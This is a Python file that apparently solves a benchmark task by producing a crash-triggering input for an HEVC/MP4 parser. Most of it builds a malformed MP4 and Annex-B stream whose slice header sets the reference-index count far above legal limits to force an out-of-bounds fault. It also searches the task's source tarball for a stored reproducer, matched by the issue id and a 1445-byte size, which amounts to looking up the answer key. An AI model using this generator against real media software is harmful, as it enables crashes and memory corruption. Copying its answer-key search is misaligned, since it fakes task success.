import os
import io
import re
import tarfile
import gzip
import struct
from typing import Optional, List, Tuple


class _BitWriter:
    __slots__ = ("_out", "_cur", "_nbits")

    def __init__(self):
        self._out = bytearray()
        self._cur = 0
        self._nbits = 0  # bits currently in _cur (0..7)

    def write_bit(self, b: int) -> None:
        self._cur = (self._cur << 1) | (b & 1)
        self._nbits += 1
        if self._nbits == 8:
            self._out.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0

    def write_bits(self, v: int, n: int) -> None:
        for i in range(n - 1, -1, -1):
            self.write_bit((v >> i) & 1)

    def write_ue(self, v: int) -> None:
        if v < 0:
            v = 0
        code_num = v + 1
        lz = code_num.bit_length() - 1
        for _ in range(lz):
            self.write_bit(0)
        self.write_bit(1)
        if lz:
            self.write_bits(code_num - (1 << lz), lz)

    def write_se(self, v: int) -> None:
        if v > 0:
            code_num = 2 * v - 1
        else:
            code_num = -2 * v
        self.write_ue(code_num)

    def write_trailing_bits(self) -> None:
        self.write_bit(1)
        while self._nbits != 0:
            self.write_bit(0)

    def finish(self) -> bytes:
        if self._nbits:
            self._cur <<= (8 - self._nbits)
            self._out.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0
        return bytes(self._out)


def _is_probably_text(data: bytes) -> bool:
    if not data:
        return True
    n = min(len(data), 2048)
    sample = data[:n]
    printable = 0
    for b in sample:
        if b in (9, 10, 13) or 32 <= b <= 126:
            printable += 1
    ratio = printable / n
    if ratio >= 0.92 and b"\x00" not in sample:
        return True
    return False


def _name_score(name: str) -> int:
    n = name.lower()
    s = 0
    if "clusterfuzz" in n:
        s += 200
    if "testcase" in n:
        s += 120
    if "crash" in n:
        s += 120
    if "poc" in n:
        s += 90
    if "repro" in n or "reproducer" in n:
        s += 90
    if "42537907" in n:
        s += 250
    if "hevc" in n or "h265" in n or "hvc" in n:
        s += 60
    if any(x in n for x in ("/corpus/", "/seed/", "/seeds/", "/testcases/", "/crashes/", "/reproducers/")):
        s += 50
    return s


def _ext_is_text(name: str) -> bool:
    n = name.lower()
    _, ext = os.path.splitext(n)
    if ext in (".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".py", ".java", ".go", ".rs", ".js", ".ts", ".sh",
               ".md", ".rst", ".txt", ".json", ".yaml", ".yml", ".cmake", ".mk", ".am", ".ac", ".in",
               ".html", ".xml", ".css", ".toml"):
        return True
    return False


def _try_gunzip(data: bytes) -> Optional[bytes]:
    if len(data) >= 2 and data[0] == 0x1F and data[1] == 0x8B:
        try:
            out = gzip.decompress(data)
            return out
        except Exception:
            return None
    return None


def _tar_iter_files(t: tarfile.TarFile):
    for m in t.getmembers():
        if not m.isfile():
            continue
        if m.size <= 0:
            continue
        yield m


def _read_tar_member(t: tarfile.TarFile, m: tarfile.TarInfo, max_bytes: int = 2_000_000) -> Optional[bytes]:
    if m.size > max_bytes:
        return None
    f = t.extractfile(m)
    if f is None:
        return None
    try:
        return f.read()
    except Exception:
        return None


def _find_poc_in_tar(src_path: str) -> Optional[bytes]:
    try:
        with tarfile.open(src_path, "r:*") as t:
            candidates: List[Tuple[float, bytes, str]] = []
            for m in _tar_iter_files(t):
                name = m.name
                if _ext_is_text(name) and _name_score(name) < 200:
                    continue
                if m.size > 200_000 and _name_score(name) < 200:
                    continue

                data = _read_tar_member(t, m, max_bytes=300_000)
                if not data:
                    continue

                # Consider gz inside tar
                if name.lower().endswith((".gz", ".gzip")) or (len(data) >= 2 and data[0] == 0x1F and data[1] == 0x8B):
                    dec = _try_gunzip(data)
                    if dec and 0 < len(dec) <= 300_000:
                        data2 = dec
                        name2 = name + " (gunzipped)"
                        sc = _name_score(name) + 30
                        if len(data2) == 1445:
                            sc += 300
                        if len(data2) <= 5000:
                            sc += 60
                        if not _is_probably_text(data2):
                            sc += 80
                        sc -= len(data2) / 20.0
                        candidates.append((sc, data2, name2))

                sc = _name_score(name)
                if m.size == 1445:
                    sc += 300
                if m.size <= 5000:
                    sc += 50
                if not _is_probably_text(data):
                    sc += 70
                sc -= m.size / 20.0
                candidates.append((sc, data, name))

            if not candidates:
                return None

            candidates.sort(key=lambda x: x[0], reverse=True)

            # Strong preference for exact 1445-byte binary-ish
            for sc, data, name in candidates[:200]:
                if len(data) == 1445 and not _is_probably_text(data):
                    return data

            # Otherwise return best scored candidate that isn't clearly source text
            for sc, data, name in candidates[:200]:
                if not _is_probably_text(data):
                    return data

            # Fallback: return best overall
            return candidates[0][1]
    except Exception:
        return None


def _infer_input_kind_from_tar(src_path: str) -> Optional[str]:
    # Returns 'mp4' or 'raw' or None
    try:
        with tarfile.open(src_path, "r:*") as t:
            hit_mp4 = 0
            hit_raw = 0
            for m in _tar_iter_files(t):
                name = m.name.lower()
                if not (name.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")) or "fuzz" in name):
                    continue
                if m.size > 250_000:
                    continue
                data = _read_tar_member(t, m, max_bytes=260_000)
                if not data:
                    continue
                try:
                    txt = data.decode("utf-8", "ignore")
                except Exception:
                    continue
                if "LLVMFuzzerTestOneInput" not in txt and "FuzzerTestOneInput" not in txt:
                    continue
                low = txt.lower()
                if any(k in low for k in ("gf_isom_open", "isom", "mp4", "isobmff", "mov", "ftyp", "moov", "mdat")):
                    hit_mp4 += 1
                if any(k in low for k in ("gf_hevc", "hevc", "h265", "nalu", "annexb", "startcode")):
                    hit_raw += 1
                # if there is clear MP4 usage, decide
                if hit_mp4 >= 1 and hit_mp4 >= hit_raw:
                    return "mp4"
                if hit_raw >= 2 and hit_raw > hit_mp4:
                    return "raw"
            if hit_mp4 and hit_mp4 >= hit_raw:
                return "mp4"
            if hit_raw and hit_raw > hit_mp4:
                return "raw"
    except Exception:
        return None
    return None


def _nal_header(nal_unit_type: int, layer_id: int = 0, temporal_id_plus1: int = 1) -> bytes:
    # forbidden_zero_bit(1)=0, nal_unit_type(6), nuh_layer_id(6), nuh_temporal_id_plus1(3)
    b0 = ((nal_unit_type & 0x3F) << 1) | ((layer_id >> 5) & 0x01)
    b1 = ((layer_id & 0x1F) << 3) | (temporal_id_plus1 & 0x07)
    return bytes((b0, b1))


def _write_profile_tier_level(bw: _BitWriter, profile_idc: int = 1, level_idc: int = 90, max_sub_layers_minus1: int = 0) -> None:
    bw.write_bits(0, 2)  # general_profile_space
    bw.write_bits(0, 1)  # general_tier_flag
    bw.write_bits(profile_idc & 0x1F, 5)
    bw.write_bits(0, 32)  # general_profile_compatibility_flags
    bw.write_bits(0, 48)  # general_constraint_indicator_flags
    bw.write_bits(level_idc & 0xFF, 8)
    # sub_layer_profile_present_flag[i], sub_layer_level_present_flag[i]
    for _ in range(max_sub_layers_minus1):
        bw.write_bit(0)
        bw.write_bit(0)
    if max_sub_layers_minus1 > 0:
        for _ in range(max_sub_layers_minus1, 8):
            bw.write_bits(0, 2)  # reserved_zero_2bits
    # no sub-layer PTL since flags are 0


def _build_vps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # vps_video_parameter_set_id
    bw.write_bit(1)      # vps_base_layer_internal_flag
    bw.write_bit(1)      # vps_base_layer_available_flag
    bw.write_bits(0, 6)  # vps_max_layers_minus1
    bw.write_bits(0, 3)  # vps_max_sub_layers_minus1
    bw.write_bit(1)      # vps_temporal_id_nesting_flag
    bw.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits
    _write_profile_tier_level(bw, profile_idc=1, level_idc=90, max_sub_layers_minus1=0)
    bw.write_bit(1)  # vps_sub_layer_ordering_info_present_flag
    # for i = 0..0
    bw.write_ue(0)  # vps_max_dec_pic_buffering_minus1
    bw.write_ue(0)  # vps_max_num_reorder_pics
    bw.write_ue(0)  # vps_max_latency_increase_plus1
    bw.write_bits(0, 6)  # vps_max_layer_id
    bw.write_ue(0)       # vps_num_layer_sets_minus1
    bw.write_bit(0)      # vps_timing_info_present_flag
    bw.write_bit(0)      # vps_extension_flag
    bw.write_trailing_bits()
    return bw.finish()


def _build_sps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # sps_video_parameter_set_id
    bw.write_bits(0, 3)  # sps_max_sub_layers_minus1
    bw.write_bit(1)      # sps_temporal_id_nesting_flag
    _write_profile_tier_level(bw, profile_idc=1, level_idc=90, max_sub_layers_minus1=0)
    bw.write_ue(0)  # sps_seq_parameter_set_id
    bw.write_ue(1)  # chroma_format_idc = 1 (4:2:0)
    bw.write_ue(16)  # pic_width_in_luma_samples
    bw.write_ue(16)  # pic_height_in_luma_samples
    bw.write_bit(0)  # conformance_window_flag
    bw.write_ue(0)  # bit_depth_luma_minus8
    bw.write_ue(0)  # bit_depth_chroma_minus8
    bw.write_ue(0)  # log2_max_pic_order_cnt_lsb_minus4 (=> 4 bits)
    bw.write_bit(0)  # sps_sub_layer_ordering_info_present_flag
    # for i = 0..0
    bw.write_ue(0)  # sps_max_dec_pic_buffering_minus1
    bw.write_ue(0)  # sps_max_num_reorder_pics
    bw.write_ue(0)  # sps_max_latency_increase_plus1
    bw.write_ue(0)  # log2_min_luma_coding_block_size_minus3
    bw.write_ue(0)  # log2_diff_max_min_luma_coding_block_size
    bw.write_ue(0)  # log2_min_luma_transform_block_size_minus2
    bw.write_ue(0)  # log2_diff_max_min_luma_transform_block_size
    bw.write_ue(0)  # max_transform_hierarchy_depth_inter
    bw.write_ue(0)  # max_transform_hierarchy_depth_intra
    bw.write_bit(0)  # scaling_list_enabled_flag
    bw.write_bit(0)  # amp_enabled_flag
    bw.write_bit(0)  # sample_adaptive_offset_enabled_flag
    bw.write_bit(0)  # pcm_enabled_flag
    bw.write_ue(1)  # num_short_term_ref_pic_sets
    # short_term_ref_pic_set(0): num_negative_pics, num_positive_pics
    bw.write_ue(0)
    bw.write_ue(0)
    bw.write_bit(0)  # long_term_ref_pics_present_flag
    bw.write_bit(0)  # sps_temporal_mvp_enabled_flag
    bw.write_bit(0)  # strong_intra_smoothing_enabled_flag
    bw.write_bit(0)  # vui_parameters_present_flag
    bw.write_bit(0)  # sps_extension_present_flag
    bw.write_trailing_bits()
    return bw.finish()


def _build_pps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_ue(0)  # pps_pic_parameter_set_id
    bw.write_ue(0)  # pps_seq_parameter_set_id
    bw.write_bit(0)  # dependent_slice_segments_enabled_flag
    bw.write_bit(0)  # output_flag_present_flag
    bw.write_bits(0, 3)  # num_extra_slice_header_bits
    bw.write_bit(0)  # sign_data_hiding_enabled_flag
    bw.write_bit(0)  # cabac_init_present_flag
    bw.write_ue(0)  # num_ref_idx_l0_default_active_minus1
    bw.write_ue(0)  # num_ref_idx_l1_default_active_minus1
    bw.write_se(0)  # init_qp_minus26
    bw.write_bit(0)  # constrained_intra_pred_flag
    bw.write_bit(0)  # transform_skip_enabled_flag
    bw.write_bit(0)  # cu_qp_delta_enabled_flag
    bw.write_se(0)   # pps_cb_qp_offset
    bw.write_se(0)   # pps_cr_qp_offset
    bw.write_bit(0)  # pps_slice_chroma_qp_offsets_present_flag
    bw.write_bit(0)  # weighted_pred_flag
    bw.write_bit(0)  # weighted_bipred_flag
    bw.write_bit(0)  # transquant_bypass_enabled_flag
    bw.write_bit(0)  # tiles_enabled_flag
    bw.write_bit(0)  # entropy_coding_sync_enabled_flag
    bw.write_bit(0)  # pps_loop_filter_across_slices_enabled_flag
    bw.write_bit(0)  # deblocking_filter_control_present_flag
    bw.write_bit(0)  # pps_scaling_list_data_present_flag
    bw.write_bit(0)  # lists_modification_present_flag
    bw.write_ue(0)   # log2_parallel_merge_level_minus2
    bw.write_bit(0)  # slice_segment_header_extension_present_flag
    bw.write_bit(0)  # pps_extension_present_flag
    bw.write_trailing_bits()
    return bw.finish()


def _build_slice_rbsp(num_ref_idx_l0_active_minus1: int = 64) -> bytes:
    bw = _BitWriter()
    bw.write_bit(1)   # first_slice_segment_in_pic_flag
    bw.write_ue(0)    # slice_pic_parameter_set_id
    bw.write_ue(1)    # slice_type = P
    bw.write_bits(0, 4)  # slice_pic_order_cnt_lsb (log2_max_pic_order_cnt_lsb=4)
    bw.write_bit(1)   # short_term_ref_pic_set_sps_flag
    bw.write_bit(1)   # num_ref_idx_active_override_flag
    bw.write_ue(num_ref_idx_l0_active_minus1)  # num_ref_idx_l0_active_minus1
    bw.write_ue(0)    # five_minus_max_num_merge_cand
    bw.write_se(0)    # slice_qp_delta
    bw.write_trailing_bits()
    return bw.finish()


def _build_hevc_nals(num_ref_idx_l0_active_minus1: int = 64) -> Tuple[bytes, bytes, bytes, bytes]:
    vps = _nal_header(32) + _build_vps_rbsp()
    sps = _nal_header(33) + _build_sps_rbsp()
    pps = _nal_header(34) + _build_pps_rbsp()
    slc = _nal_header(1) + _build_slice_rbsp(num_ref_idx_l0_active_minus1=num_ref_idx_l0_active_minus1)
    return vps, sps, pps, slc


def _build_annexb_stream(num_ref_idx_l0_active_minus1: int = 64) -> bytes:
    vps, sps, pps, slc = _build_hevc_nals(num_ref_idx_l0_active_minus1=num_ref_idx_l0_active_minus1)
    sc = b"\x00\x00\x00\x01"
    return sc + vps + sc + sps + sc + pps + sc + slc


def _box(typ: str, payload: bytes) -> bytes:
    if isinstance(typ, str):
        typb = typ.encode("ascii", "strict")
    else:
        typb = typ
    return struct.pack(">I4s", 8 + len(payload), typb) + payload


def _full_box(typ: str, version: int, flags: int, payload: bytes) -> bytes:
    vf = struct.pack(">I", ((version & 0xFF) << 24) | (flags & 0xFFFFFF))
    return _box(typ, vf + payload)


def _build_hvcc(vps: bytes, sps: bytes, pps: bytes, length_size_minus_one: int = 3) -> bytes:
    # HEVCDecoderConfigurationRecord
    configuration_version = 1
    general_profile_space = 0
    general_tier_flag = 0
    general_profile_idc = 1
    general_profile_compatibility_flags = 0
    general_constraint_indicator_flags = 0
    general_level_idc = 90

    min_spatial_segmentation_idc = 0
    parallelism_type = 0
    chroma_format = 1
    bit_depth_luma_minus8 = 0
    bit_depth_chroma_minus8 = 0
    avg_frame_rate = 0
    constant_frame_rate = 0
    num_temporal_layers = 1
    temporal_id_nested = 1

    b = bytearray()
    b.append(configuration_version)
    b.append((general_profile_space << 6) | (general_tier_flag << 5) | (general_profile_idc & 0x1F))
    b += struct.pack(">I", general_profile_compatibility_flags)
    b += general_constraint_indicator_flags.to_bytes(6, "big")
    b.append(general_level_idc & 0xFF)
    b += struct.pack(">H", 0xF000 | (min_spatial_segmentation_idc & 0x0FFF))
    b.append(0xFC | (parallelism_type & 0x03))
    b.append(0xFC | (chroma_format & 0x03))
    b.append(0xF8 | (bit_depth_luma_minus8 & 0x07))
    b.append(0xF8 | (bit_depth_chroma_minus8 & 0x07))
    b += struct.pack(">H", avg_frame_rate & 0xFFFF)
    b.append(((constant_frame_rate & 0x03) << 6) |
             ((num_temporal_layers & 0x07) << 3) |
             ((temporal_id_nested & 0x01) << 2) |
             (length_size_minus_one & 0x03))

    arrays = [(32, vps), (33, sps), (34, pps)]
    b.append(len(arrays) & 0xFF)
    for nalu_type, nalu in arrays:
        b.append(0x80 | (nalu_type & 0x3F))  # array_completeness=1, reserved=0
        b += struct.pack(">H", 1)  # numNalus
        b += struct.pack(">H", len(nalu))
        b += nalu

    return bytes(b)


def _pack_language_und() -> int:
    # 'und' => 21,14,4
    return (21 << 10) | (14 << 5) | 4


def _build_mp4_with_hevc_sample(num_ref_idx_l0_active_minus1: int = 64) -> bytes:
    vps, sps, pps, slc = _build_hevc_nals(num_ref_idx_l0_active_minus1=num_ref_idx_l0_active_minus1)

    # sample data: 4-byte lengths + NALs (typically only slices; params in hvcc)
    sample = struct.pack(">I", len(slc)) + slc

    hvcc = _build_hvcc(vps, sps, pps, length_size_minus_one=3)
    hvcc_box = _box("hvcC", hvcc)

    # VisualSampleEntry ('hvc1')
    width = 16
    height = 16
    vsp = bytearray()
    vsp += b"\x00" * 6
    vsp += struct.pack(">H", 1)  # data_reference_index
    vsp += struct.pack(">HH", 0, 0)  # pre_defined, reserved
    vsp += b"\x00" * 12  # pre_defined[3]
    vsp += struct.pack(">HH", width, height)
    vsp += struct.pack(">II", 0x00480000, 0x00480000)  # horiz/vert resolution
    vsp += struct.pack(">I", 0)  # reserved
    vsp += struct.pack(">H", 1)  # frame_count
    vsp += b"\x00" * 32  # compressorname
    vsp += struct.pack(">H", 0x0018)  # depth
    vsp += struct.pack(">h", -1)  # pre_defined
    vsp += hvcc_box
    hvc1_entry = _box("hvc1", bytes(vsp))
    stsd = _full_box("stsd", 0, 0, struct.pack(">I", 1) + hvc1_entry)

    stts = _full_box("stts", 0, 0, struct.pack(">II", 1, 1) + struct.pack(">I", 1))  # WRONG layout, fix below


    # Correct stts payload: entry_count(4) + (sample_count(4), sample_delta(4)) * entry_count
    stts = _full_box("stts", 0, 0, struct.pack(">I", 1) + struct.pack(">II", 1, 1))

    stsc = _full_box("stsc", 0, 0, struct.pack(">I", 1) + struct.pack(">III", 1, 1, 1))
    stsz = _full_box("stsz", 0, 0, struct.pack(">II", 0, 1) + struct.pack(">I", len(sample)))

    def stco_with_offset(off: int) -> bytes:
        return _full_box("stco", 0, 0, struct.pack(">I", 1) + struct.pack(">I", off))

    stbl = _box("stbl", stsd + stts + stsc + stsz + stco_with_offset(0))

    # dinf
    url = _full_box("url ", 0, 1, b"")  # self-contained
    dref = _full_box("dref", 0, 0, struct.pack(">I", 1) + url)
    dinf = _box("dinf", dref)

    vmhd = _full_box("vmhd", 0, 1, struct.pack(">HHHH", 0, 0, 0, 0))
    minf = _box("minf", vmhd + dinf + stbl)

    # mdia
    mdhd = _full_box(
        "mdhd",
        0,
        0,
        struct.pack(">IIII", 0, 0, 1000, 1) + struct.pack(">HH", _pack_language_und(), 0),
    )
    hdlr_name = b"VideoHandler\x00"
    hdlr = _full_box("hdlr", 0, 0, struct.pack(">I4sIII", 0, b"vide", 0, 0, 0) + hdlr_name)
    mdia = _box("mdia", mdhd + hdlr + minf)

    # trak
    matrix = (
        struct.pack(">I", 0x00010000) + struct.pack(">I", 0) + struct.pack(">I", 0) +
        struct.pack(">I", 0) + struct.pack(">I", 0x00010000) + struct.pack(">I", 0) +
        struct.pack(">I", 0) + struct.pack(">I", 0) + struct.pack(">I", 0x40000000)
    )
    tkhd = _full_box(
        "tkhd",
        0,
        0x000007,
        struct.pack(">IIII", 0, 0, 1, 0) + struct.pack(">I", 1) + struct.pack(">I", 0) +
        struct.pack(">II", 0, 0) + struct.pack(">HHHH", 0, 0, 0, 0) +
        matrix + struct.pack(">II", width << 16, height << 16),
    )
    trak = _box("trak", tkhd + mdia)

    # moov
    mvhd = _full_box(
        "mvhd",
        0,
        0,
        struct.pack(">IIII", 0, 0, 1000, 1) +
        struct.pack(">I", 0x00010000) + struct.pack(">H", 0x0100) + struct.pack(">H", 0) +
        struct.pack(">I", 0) + struct.pack(">I", 0) + matrix + (b"\x00" * 24) +
        struct.pack(">I", 2),
    )
    moov0 = _box("moov", mvhd + trak)

    ftyp = _box("ftyp", b"isom" + struct.pack(">I", 0) + b"isom" + b"iso2" + b"mp41")

    # Determine offset and rebuild moov with stco patched
    mdat = _box("mdat", sample)

    # Rebuild stbl with correct offset in second pass
    offset = len(ftyp) + len(moov0) + 8  # start of mdat payload
    stbl2 = _box("stbl", stsd + stts + stsc + stsz + stco_with_offset(offset))
    minf2 = _box("minf", vmhd + dinf + stbl2)
    mdia2 = _box("mdia", mdhd + hdlr + minf2)
    trak2 = _box("trak", tkhd + mdia2)
    moov = _box("moov", mvhd + trak2)

    # Final with correct offset:
    mp4 = ftyp + moov + mdat
    return mp4


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = None
        if src_path and os.path.isfile(src_path):
            poc = _find_poc_in_tar(src_path)

        if poc is not None and len(poc) > 0:
            return poc

        kind = None
        if src_path and os.path.isfile(src_path):
            kind = _infer_input_kind_from_tar(src_path)

        # Build a robust PoC: MP4 with HEVC sample; optionally append annex-b stream for parsers that scan raw.
        num_ref_idx_l0_active_minus1 = 64  # significantly above typical 15, but not too huge
        if kind == "raw":
            return _build_annexb_stream(num_ref_idx_l0_active_minus1=num_ref_idx_l0_active_minus1)

        mp4 = _build_mp4_with_hevc_sample(num_ref_idx_l0_active_minus1=num_ref_idx_l0_active_minus1)
        annexb = _build_annexb_stream(num_ref_idx_l0_active_minus1=num_ref_idx_l0_active_minus1)
        return mp4 + annexb